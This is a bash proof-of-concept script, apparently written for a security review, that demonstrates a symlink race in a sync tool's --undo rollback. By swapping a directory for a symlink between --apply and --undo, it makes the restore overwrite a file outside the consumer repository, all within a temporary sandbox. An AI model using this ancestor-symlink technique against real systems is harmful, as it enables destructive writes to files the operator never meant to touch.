#!/usr/bin/env bash
# --undo containment escape, destructive variant.
#
# Threat model is identical to the ancestor-symlink attack the round-3 write
# path now refuses: an attacker who can write inside the consumer repo.
#
#  t0  attacker plants a symlink at the vendored-catalog leaf
#  t1  operator runs --apply.  The undo journal records the *unresolved*
#      consumer path (the [ -L "$target" ] branch never sets resolved_target),
#      and the write loop correctly refuses -> exit 1.
#  t2  attacker replaces the leaf's parent directory with a symlink pointing
#      outside the consumer repo.
#  t3  operator rolls back with --undo.  restore_backup_atomically() mkdir -p's
#      and rename(2)s onto the journal's unresolved path with NO containment
#      check, so the write follows the ancestor symlink and clobbers a file
#      outside the consumer root.  Exit 0, "UNDO COMPLETE", no warning.
set -u
WT="$1"
BASE="$(mktemp -d /tmp/hs-ue.XXXXXX)"
mkdir -p "$BASE/consumer/docs/vendor/hindsight" "$BASE/outside/victimdir"
printf 'PRECIOUS-VICTIM-FILE-OUTSIDE-THE-CONSUMER-REPO\n' > "$BASE/outside/victimdir/failure-modes.md"
printf 'decoy\n' > "$BASE/decoy"
printf '%s\n' "$BASE/consumer" > "$BASE/consumers.txt"
V="$BASE/outside/victimdir/failure-modes.md"
echo "HEAD=$(git -C "$WT" rev-parse --short HEAD)   BASE=$BASE"

echo "== t0: attacker plants a leaf symlink inside the consumer repo =="
ln -s "$BASE/decoy" "$BASE/consumer/docs/vendor/hindsight/failure-modes.md"
echo "victim BEFORE: $(sha256sum "$V")"
echo "victim BEFORE: $(stat -c 'ino=%i size=%s type=%F' "$V")"

echo
echo "== t1: operator runs --apply =="
bash "$WT/bin/sync-failure-modes.sh" --apply --consumers "$BASE/consumers.txt"
echo "APPLY EXIT=$?"
J=$(ls -dt /tmp/hindsight-sync-undo.*/journal.tsv 2>/dev/null | head -1)
echo "journal:"; sed 's/^/   /' "$J"

echo
echo "== t2: attacker swaps the leaf's parent for a symlink pointing outside =="
rm -f "$BASE/consumer/docs/vendor/hindsight/failure-modes.md"
rmdir "$BASE/consumer/docs/vendor/hindsight"
ln -s "$BASE/outside/victimdir" "$BASE/consumer/docs/vendor/hindsight"
ls -l "$BASE/consumer/docs/vendor/"

echo
echo "== t3: operator rolls back with --undo =="
bash "$WT/bin/sync-failure-modes.sh" --undo "$J"
echo "UNDO EXIT=$?"

echo
echo "victim AFTER : $(sha256sum "$V" 2>&1)"
echo "victim AFTER : $(stat -c 'ino=%i size=%s type=%F' "$V" 2>&1)"
echo "victim content now:"; ls -l "$V"; cat "$V" 2>/dev/null | head -2
echo
echo "outside tree after undo:"; find "$BASE/outside" -mindepth 1 -printf '  %y %s %p -> %l\n' | sort
